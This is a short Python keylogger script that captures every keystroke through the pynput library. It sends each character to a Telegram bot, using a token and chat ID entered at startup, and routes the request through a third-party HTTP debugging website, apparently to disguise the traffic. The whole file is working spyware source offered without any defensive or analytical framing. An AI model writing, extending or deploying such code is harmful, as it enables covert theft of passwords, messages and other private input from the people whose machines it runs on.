from pynput import keyboard
import requests

mytel = []

A1 = input("pls add token")
A2 = input("pls add chat id")
def keyboard_start():
    with keyboard.Listener(on_press=keyboard_log) as lstn:
        lstn.join()

def keyboard_log(key):
   
    try:
        if type(key) == keyboard._win32.KeyCode:

            mykey = key.char
            mytel.append(mykey)
           
           
            #if len (mytel) == 1 :
            send(mykey)
            mytel.clear()
            #rint(mytel)
           
           
            if "+" in mykey:
                exit()
   
        else:
            print(str(key))



    except Exception as ex:
        print(ex)



def send (num):
   
 url = ("https://api.telegram.org/"+A1+"/sendmessage?chat_id="+A2+"&text="+str(num))


 payload = {"UrlBox":url,
            
     "Agentlist":"Googel chrome",
     "versionslist":"HTTP/1.1",
     "Methodlist":"POST"
    }

 http = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload)
#  print(http)


keyboard_start()
